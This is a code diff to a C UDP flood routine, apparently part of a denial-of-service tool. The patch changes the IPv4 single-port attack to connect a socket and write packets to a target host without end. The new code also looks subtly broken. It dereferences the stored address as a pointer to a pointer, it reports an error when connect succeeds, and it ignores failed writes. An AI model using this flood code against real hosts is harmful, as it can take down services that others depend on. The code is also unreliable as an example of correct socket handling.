@@ -11,12 +11,14 @@
 // WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 // See the License for the specific language governing permissions and
 // limitations under the License.
-#include <string.h>
 #include <netinet/in.h>
+#include <unistd.h>
+#include <signal.h>
+#include <string.h>
 
+#include <lib/err.h>
 #include <lib/info.h>
 #include <lib/util.h>
-#include <lib/err.h>
 
 #include "udp_flood.h"
 
@@ -56,11 +58,27 @@ static conn_t *connection;
 static void single4_port(void)
 {
 	DEBUG("Udp4 flood attack is starting using random ports");
-	struct sockaddr_in in = *(struct sockaddr_in*)connection->addr;
+	//struct sockaddr_in in = *(struct sockaddr_in *)connection->addr;
+	ssize_t n;
+	struct sockaddr_in *in = *(struct sockaddr_in **)connection->addr;
+	// if write failures occures we want to handle them where the error
+	// occurs rather than in a sigpipe handler.
+	if(signal(SIGPIPE, SIG_IGN) == SIG_ERR)
+		INFOEE("Failed to ingore the signal pipe");
+	
+	// this does not result in anything like a tcp connection.
+	// we tell the kernel just to check for any immediate errors.
+	// if we use sendto and remove the connect the kernel involves the
+	// 3 steps like : connect the socket, output the fist datagram, unconnectthe socket.
+	// so for calling connect and the write one time involves the this steps by the kernel:
+	// connect the socket , output fist datagram.
+	if(!connect(connection->sock, (SA*)in, sizeof(*in)))
+		INFOEE("Udp4 socket can't be connected");
+	
 	for (;;) {
-		sendto(connection->sock,
-				connection->buff,
-				connection->bufflen,0, (SA*)&in, sizeof(in));
+		n = write(connection->sock, connection->buff, connection->bufflen);
+		if (!n)
+			break;
 	}
 }
 
@@ -95,7 +113,7 @@ static void range6_port(void)
 #define RANDOM_PORT(ipv) ((ipv == IPV4) ? random4_port : random6_port)
 #define SINGLE_PORT(ipv) ((ipv == IPV4) ? single4_port : single6_port)
 #define RANGE_PORT(ipv) ((ipv == IPV4) ? range4_port : range6_port)
-#define IP_SPEC(ipv) ((ipv == IPV4)? AF_INET : AF_INET6)
+#define IP_SPEC(ipv) ((ipv == IPV4) ? AF_INET : AF_INET6)
 
 void udp_flood_attack(void)
 {
@@ -119,7 +137,7 @@ void udp_flood_init(conn_t *conn, arguments args)
 	switch (args.host_type) {
 	case IPV4:
 		in.sin_family = AF_INET;
-		in.sin_port = htons(args.port.n);
+		in.sin_port   = htons(args.port.n);
 		inet_pton(AF_INET, args.host, &in.sin_addr);
 		memcpy(conn->addr, &in, sizeof(in));
 		break;
@@ -143,8 +161,8 @@ void udp_flood_init(conn_t *conn, arguments args)
 
 	// assign singleton with the new connection
 	connection = conn;
-	
-	// now we should test if we are dealing with single,range or random port attack	
+
+	// now we should test if we are dealing with single,range or random port attack
 	if (args.port.random) {
 		DEBUG("Udp flood is choosing random port attack implementation");
 		impl = RANDOM_PORT(args.host_type);
